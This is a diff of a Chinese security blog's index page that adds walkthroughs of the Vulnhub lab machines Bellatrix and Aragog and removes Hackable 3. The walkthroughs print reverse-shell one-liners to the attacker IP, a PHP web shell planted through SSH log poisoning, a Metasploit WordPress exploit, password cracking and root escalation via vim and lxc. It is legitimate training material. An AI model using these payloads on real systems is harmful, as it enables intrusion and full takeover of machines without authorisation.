@@ -82,6 +82,194 @@
 
     
         <h2 class="title">
+            <a href="/2022/08/08/Hogwarts-Bellatrix/">
+                Hogwarts Bellatrix
+            </a>
+        </h2>
+    
+    <time>
+        Aug 8, 2022
+    </time>
+    <section class="content">
+        <h1><span id="hogwarts-bellatrix">HOGWARTS: BELLATRIX</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
+<h4><span id="名称hogwarts-bellatrix">名称：Hogwarts: Bellatrix</span></h4><h4><span id="发布日期20201128">发布日期：2020.11.28</span></h4><h4><span id="作者bly">作者：BLY</span></h4><h4><span id="系列hogwarts">系列：Hogwarts</span></h4><h4><span id="推特bertrandlorent9">推特：@BertrandLorent9</span></h4></blockquote>
+<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
+<h4><span id="flags">Flags：</span></h4><p>root:&#x2F;root&#x2F;root.txt </p>
+<h4><span id="难度简单">难度：简单</span></h4></blockquote>
+<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
+<h4><span id="文件名bellatrixova">文件名：Bellatrix.ova</span></h4><h4><span id="文件大小41gb">文件大小：4.1GB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimagehogwartsbellatrixova">下载地址：</span></h4><h4><span id="md5-e6d98d406cdf7641e4a966f16afaf536">MD5: E6D98D406CDF7641E4A966F16AFAF536</span></h4><h4><span id="sha1-8389861c7f2b1626190844e31a2a1a4ade385e06">SHA1: 8389861C7F2B1626190844E31A2A1A4ADE385E06</span></h4></blockquote>
+<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
+<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxubuntu">操作系统：Linux(ubuntu)</span></h4></blockquote>
+<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
+<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
+<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
+<p>1.将靶机Bellatrix和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/1.png" alt="image-"></p>
+</blockquote>
+<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
+<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/2.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/3.png" alt="image-"></p>
+<p>2.再进行端口扫描，发现只开放了22和80端口，访问主页，发现提示存在文件包含：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.127 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/4.png" alt="image-"></p>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/5.png" alt="image-"></p>
+<p>3.最后再进行一下目录扫描，没有太多值得关注的信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.127 -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，目录扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/6.png" alt="image-"></p>
+</blockquote>
+<h3><span id="文件包含漏洞利用">文件包含漏洞利用</span></h3><blockquote>
+<p>1.在主页其实是提示了有ikilledsiriusblack.php这个文件，后面跟file参数存在文件包含漏洞：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.127/ikilledsiriusblack.php?file=/etc/passwd</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/7.png" alt="image-"></p>
+<p>2.利用文件包含漏洞，写入payload，获得shell：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.127/ikilledsiriusblack.php?file=/var/log/auth.log，可以查看SSH日志信息</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/8.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh &#x27;&lt;?php system($_GET[&#x27;cmd&#x27;]);?&gt;&#x27;@192.168.56.127，稍微污染SSH日志信息</span><br><span class="line">http://192.168.56.127/ikilledsiriusblack.php?file=/var/log/auth.log&amp;cmd=id，可以使用cmd命令</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/9.png" alt="image-"></p>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/10.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 1234</span><br><span class="line"></span><br><span class="line">http://192.168.56.127/ikilledsiriusblack.php?file=/var/log/auth.log&amp;cmd=php+-r+&#x27;$sock%3dfsockopen(&quot;192.168.56.102&quot;,1234)%3bexec(&quot;/bin/sh+-i+&lt;%263+&gt;%263+2&gt;%263&quot;)%3b&#x27;，写入命令反弹shell</span><br><span class="line"></span><br><span class="line">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;);&#x27;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/11.png" alt="image-"></p>
+</blockquote>
+<h3><span id="密码爆破初步提权">密码爆破，初步提权</span></h3><blockquote>
+<p>1.我们可以在当前目录下发现一个被类似base编码了的目录，目录下有一个隐藏的字典文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ls -la</span><br><span class="line">cd c2VjcmV0cw==</span><br><span class="line">ls -la</span><br><span class="line">cat .secret.dic</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/12.png" alt="image-"></p>
+<p>2.而Swordofgryffindor内是lestrange用户与其密码hash：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat Swordofgryffindor</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/13.png" alt="image-"></p>
+<p>3.将密码字典复制与密码hash到kali本地，利用john进行爆破：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim dic.txt</span><br><span class="line">vim hash.txt</span><br><span class="line">john --wordlist=dic.txt hash.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/14.png" alt="image-"></p>
+<p>4.可以登录到lestrange用户：</p>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/15.png" alt="image-"></p>
+</blockquote>
+<h3><span id="root提权">root提权</span></h3><blockquote>
+<p>1.利用sudo -l命令，查找可用文件，发现vim可以提权：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/16.png" alt="image-"></p>
+<p>2.直接写入，提权到root：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u root /usr/bin/vim -c &#x27;:!/bin/sh&#x27;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/17.png" alt="image-"></p>
+</blockquote>
+<h3><span id="flag获取">Flag获取</span></h3><blockquote>
+<p>1.现在我们在&#x2F;root目录下能够发现flag，即proof.txt：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">ls -la</span><br><span class="line">cat root.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Hogwarts-Bellatrix/18.png" alt="image-"></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Hogwarts/" rel="tag">Hogwarts</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2022/08/08/Harrypotter-Ar/">
+                Harrypotter Aragog
+            </a>
+        </h2>
+    
+    <time>
+        Aug 8, 2022
+    </time>
+    <section class="content">
+        <h1><span id="harrypotteraragog">HarryPotter:Aragog</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
+<h4><span id="名称harrypotteraragog">名称：HarryPotter:Aragog</span></h4><h4><span id="发布日期2021510">发布日期：2021.5.10</span></h4><h4><span id="作者mansoor-r">作者：Mansoor R</span></h4><h4><span id="系列harrypotter">系列：HarryPotter</span></h4><h4><span id="推特time4ster">推特：@time4ster</span></h4></blockquote>
+<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
+<h4><span id="flags">Flags：</span></h4><p>www-data:&#x2F;home&#x2F;hagrid98&#x2F;horcrux1.txt<br>root:&#x2F;root&#x2F;horcrux2.txt</p>
+<h4><span id="难度简单">难度：简单</span></h4></blockquote>
+<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
+<h4><span id="文件名aragog-102ova">文件名：Aragog-1.0.2.ova</span></h4><h4><span id="文件大小705mb">文件大小：705MB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimageharrypotteraragog-102ova">下载地址：</span></h4><h4><span id="md5-48a8bd22b27945a9a6fbcf6c57150162">MD5: 48A8BD22B27945A9A6FBCF6C57150162</span></h4><h4><span id="sha1-da8b34ead85c1f6ab66a907a6ba94f6b8284bcf7">SHA1: DA8B34EAD85C1F6AB66A907A6BA94F6B8284BCF7</span></h4></blockquote>
+<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
+<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxdebain">操作系统：Linux(debain)</span></h4></blockquote>
+<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
+<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
+<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
+<p>1.将靶机Aragog和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
+<p><img src="/2022/08/08/Harrypotter-Ar/1.png" alt="image-"></p>
+</blockquote>
+<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
+<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Harrypotter-Ar/2.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Harrypotter-Ar/3.png" alt="image-"></p>
+<p>2.再进行端口扫描，发现只开放了22和80端口，访问首页只有一张图片：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.104 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Harrypotter-Ar/4.png" alt="image-"></p>
+<p><img src="/2022/08/08/Harrypotter-Ar/5.png" alt="image-"></p>
+<p>3.最后再进行一下目录扫描，发现一个blog目录，可以去看看：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.56.104，目录扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Harrypotter-Ar/6.png" alt="image-"></p>
+</blockquote>
+<h3><span id="wpscan漏洞发现">wpscan漏洞发现</span></h3><blockquote>
+<p>1.直接访问192.168.56.104&#x2F;blog，发现页面提示是使用WordPress搭建的blog，想访问Notice等页面的内容和使用wpscan进行扫描，要添加一下host：</p>
+<p><img src="/2022/08/08/Harrypotter-Ar/7.png" alt="image-"></p>
+<p><img src="/2022/08/08/Harrypotter-Ar/8.png" alt="image-"></p>
+<p>2.再利用wpscan扫描得到漏洞，–pluguns-detection aggressive模式下有几个漏洞，都是有关file manager的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://wordpress.aragog.hogwarts/blog --plugins-detection aggressive</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Harrypotter-Ar/9.png" alt="image-"></p>
+</blockquote>
+<h3><span id="msf-getshell">msf getshell</span></h3><blockquote>
+<p>1.我们可以利用msf查找可用的file manager利用工具，配置后进行shell：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search file manager wordpress，查看相关漏洞利用工具</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Harrypotter-Ar/10.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">exploit/multi/http/wp_file_manager_rce -y，漏洞工具选择</span><br><span class="line">set TARGETURI /blog，配置URI</span><br><span class="line">set RHOSTS wordpress.aragog.hogwarts，配置远程地址</span><br><span class="line">set LHOST 192.168.56.102，配置本地地址</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Harrypotter-Ar/11.png" alt="image-"></p>
+<p>2.再利用python，获取一个ttyshell，查询目录，在&#x2F;home&#x2F;hagrid98下能找到第一个flag，horcrux1.txt：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python3 -c ‘import pty; pty.spawn(“/bin/bash”);’</span><br><span class="line">cat /home/hagrid98/horcrux1.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Harrypotter-Ar/12.png" alt="image-"></p>
+<p><img src="/2022/08/08/Harrypotter-Ar/13.png" alt="image-"></p>
+</blockquote>
+<h3><span id="mysql登录进行提权">mysql登录，进行提权</span></h3><blockquote>
+<p>1.在&#x2F;etc&#x2F;wordpress目录下的config-defaut.php文件内能看到一个数据库密码，登录mysql后进入wordpress数据库查询wp_users表能够得到hagrid98的ssh登录密码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/wordpress/config-default.php，得到root数据库密码</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Harrypotter-Ar/14.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p，登录mysql，密码为mySecr3tPass</span><br><span class="line">use wordpress;</span><br><span class="line">select * from wp_users;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Harrypotter-Ar/15.png" alt="image-"></p>
+<p><img src="/2022/08/08/Harrypotter-Ar/16.png" alt="image-"></p>
+<p>2.进行ssh登录hagrid98，查找备份文件可以发现一个脚本：</p>
+<p><img src="/2022/08/08/Harrypotter-Ar/17.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name &quot;*back*&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Harrypotter-Ar/18.png" alt="image-"></p>
+<p>3.在这里我们简单弹个shell，因为&#x2F;opt&#x2F;.backup.sh是被修改过的，我们也有权利进行修改：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.56.102/5555 0&gt;&amp;1&#x27;&quot; &gt;&gt; /opt/.backup.sh</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/08/Harrypotter-Ar/19.png" alt="image-"></p>
+<p>4.从.backup.sh的文件内容看，&#x2F;tmp目录是可以进行拷贝等操作的，我们可以尝试把文件拷贝到&#x2F;tmp目录下执行，同时kali监听5555端口，并且网页访问&#x2F;tmp&#x2F;tmp_wp_uploads目录：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 5555，kali监听</span><br><span class="line">cp /opt/.backup.sh /tmp/.backup.sh</span><br><span class="line">cd /tmp</span><br><span class="line">./.backup.sh</span><br></pre></td></tr></table></figure>
+
+<p>5.在root用户的&#x2F;root目录下能发现第二个flag，即horcrux2.txt：</p>
+<p><img src="/2022/08/08/Harrypotter-Ar/20.png" alt="image-"></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Harrypotter/" rel="tag">Harrypotter</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
             <a href="/2022/08/04/blue-horizon/">
                 蓝色的地平线
             </a>
@@ -699,184 +887,6 @@
         
             <div class="tags">
                 <a class="tag-none-link" href="/tags/New-Start/" rel="tag">New Start</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/06/13/Hackable-3/">
-                Hackable 3
-            </a>
-        </h2>
-    
-    <time>
-        Jun 13, 2022
-    </time>
-    <section class="content">
-        <h1><span id="hackable-iii">Hackable III</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
-<h4><span id="名称hackable-iii">名称：Hackable III</span></h4><h4><span id="发布日期202162">发布日期：2021.6.2</span></h4><h4><span id="作者elias-sousa">作者：Elias Sousa</span></h4><h4><span id="系列hackable">系列：Hackable</span></h4></blockquote>
-<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
-<h4><span id="flags">Flags：</span></h4><p>root:&#x2F;mnt&#x2F;root&#x2F;root&#x2F;root.txt</p>
-<h4><span id="难度中等">难度：中等</span></h4></blockquote>
-<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
-<h4><span id="文件名hackable3ova">文件名：hackable3.ova</span></h4><h4><span id="文件大小16gb">文件大小：1.6GB</span></h4><h4><span id="下载地址httpsdownloadvulnhubcomhackablehackable3ova">下载地址：</span></h4><h4><span id="md5-11855876a01867e9b79d6d5536f89dc0">MD5: 11855876A01867E9B79D6D5536F89DC0</span></h4><h4><span id="sha1-f5f200b85774430e0437f786de11d20a5a022d33">SHA1: F5F200B85774430E0437F786DE11D20A5A022D33</span></h4></blockquote>
-<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
-<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxdebain">操作系统：Linux(debain)</span></h4></blockquote>
-<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
-<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
-<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
-<p>1.将靶机Hackable III和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
-<p><img src="/2022/06/13/Hackable-3/1.png" alt="image-"></p>
-</blockquote>
-<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
-<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-3/2.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-3/3.png" alt="image-"></p>
-<p>2.再进行端口扫描，可以发现只开放了80端口，其中有一个http-robots.txt：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -A -p- 192.168.56.103，端口扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-3/4.png" alt="image-"></p>
-<p>3.最后再进行一下目录扫描，发现一些目录，但是没有太多的可用信息：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.56.103，目录扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-3/5.png" alt="image-"></p>
-</blockquote>
-<h3><span id="访问主页信息提取解密">访问主页，信息提取解密</span></h3><blockquote>
-<p>1.对靶机主页进行访问，查看源码发现提示：</p>
-<p><img src="/2022/06/13/Hackable-3/6.png" alt="image-"></p>
-<p>2.提示告知我们可能要用到端口knocking及图片隐写的技术，并且获得了jubiscleudo这个用户名，结合提示上方的login页，可以尝试使用sql注入，但发现其实直接登录也会跳转，虽然是空白页，但是可以查看源码：</p>
-<p><img src="/2022/06/13/Hackable-3/7.png" alt="image-"></p>
-<p><img src="/2022/06/13/Hackable-3/8.png" alt="image-"></p>
-<p>3.我们在源码里发现了一个图片指示，结合之前的提示涉及图片隐写，可以把图片获取下来，用steghide分离一下隐藏内容：</p>
-<p><img src="/2022/06/13/Hackable-3/9.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steghide extract -sf 3.jpg，分离出文本</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-3/10.png" alt="image-"></p>
-<p>4.这样我们的得到了第一个端口号，我们返回主页，去&#x2F;config目录下查看，只有一个1.txt，里面是base64编码的10000，如此我们得到第二个端口：</p>
-<p><img src="/2022/06/13/Hackable-3/11.png" alt="image-"></p>
-<p><img src="/2022/06/13/Hackable-3/12.png" alt="image-"></p>
-<p>5.同样，我们去&#x2F;css目录下查看，发现有2.txt，是brainfuck编码的4444，这就是第三个端口号：</p>
-<p><img src="/2022/06/13/Hackable-3/13.png" alt="image-"></p>
-<p><img src="/2022/06/13/Hackable-3/14.png" alt="image-"></p>
-<p>6.而&#x2F;backup目录下有一个wordlist.txt，很像密码字典，我们把这个字典获取，等下可以进行爆破：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.56.103/backup/wordlist.txt，获取密码字典</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-3/15.png" alt="image-"></p>
-</blockquote>
-<h3><span id="ssh登录">SSH登录</span></h3><blockquote>
-<p>1.利用三个端口号进行knocking，可以发现ssh已经开放：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">knock 192.168.56.103 10000 4444 65535，knock</span><br><span class="line">nmap -p22 192.168.56.103，查看22端口状态</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-3/16.png" alt="image-"></p>
-<p>2.利用wordlist.txt密码字典对jubiscleudo用户使用hydra进行爆破，登录ssh：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l jubiscleudo -P wordlist.txt 192.168.56.103 ssh</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-3/17.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh jubiscleudo@192.168.56.103，ssh登录</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-3/18.png" alt="image-"></p>
-</blockquote>
-<h3><span id="二进制提权">二进制提权</span></h3><blockquote>
-<p>1.利用jubiscleudo帐户，我们能查看&#x2F;var&#x2F;www&#x2F;html目录下.backup_config.php文件，可以发现用户hackable_3及其密码：</p>
-<p><img src="/2022/06/13/Hackable-3/19.png" alt="image-"></p>
-<p>2.登录hackable_3，查看组，发现二进制文件lxc和lxd可用：</p>
-<p><img src="/2022/06/13/Hackable-3/20.png" alt="image-"></p>
-<p>3.我们可以利用alpine进行提权，系列命令如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Kali：</span><br><span class="line">把准备好的alpine压缩包传上靶机，命令如下：</span><br><span class="line">scp /tmp/alpine-minirootfs-3.14.1-x86_64.tar.gz hackable_3@192.168.56.103:/tmp/</span><br><span class="line"></span><br><span class="line">hackable_3:</span><br><span class="line">cd /tmp</span><br><span class="line">lxc image import ./ alpine-minirootfs-3.14.1-x86_64.tar.gz –alias fasto</span><br><span class="line">lxc image list</span><br><span class="line">lxd init</span><br><span class="line">lxc init fasto groot -c security.privileged=true</span><br><span class="line">lxc config device add groot mydevice disk source=/ path=/mnt/root recursive=true</span><br><span class="line"></span><br><span class="line">lxc start groot</span><br><span class="line">lxc exec groot /bin/sh</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-3/21.png" alt="image-"></p>
-<p><img src="/2022/06/13/Hackable-3/22.png" alt="image-"></p>
-<p>4.在&#x2F;mnt&#x2F;root&#x2F;root目录下，可以发现root.txt，即flag：</p>
-<p><img src="/2022/06/13/Hackable-3/23.png" alt="image-"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Hackable/" rel="tag">Hackable</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/06/13/Hackable-2/">
-                Hackable 2
-            </a>
-        </h2>
-    
-    <time>
-        Jun 13, 2022
-    </time>
-    <section class="content">
-        <h1><span id="hackable-ii">Hackable II</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
-<h4><span id="名称hackable-ii">名称：Hackable II</span></h4><h4><span id="发布日期2021615">发布日期：2021.6.15</span></h4><h4><span id="作者elias-sousa">作者：Elias Sousa</span></h4><h4><span id="系列hackable">系列：Hackable</span></h4></blockquote>
-<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
-<h4><span id="flags">Flags：</span></h4><p>shrek:&#x2F;~&#x2F;user.txt<br>root:&#x2F;root&#x2F;root.txt</p>
-<h4><span id="难度简单">难度：简单</span></h4></blockquote>
-<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
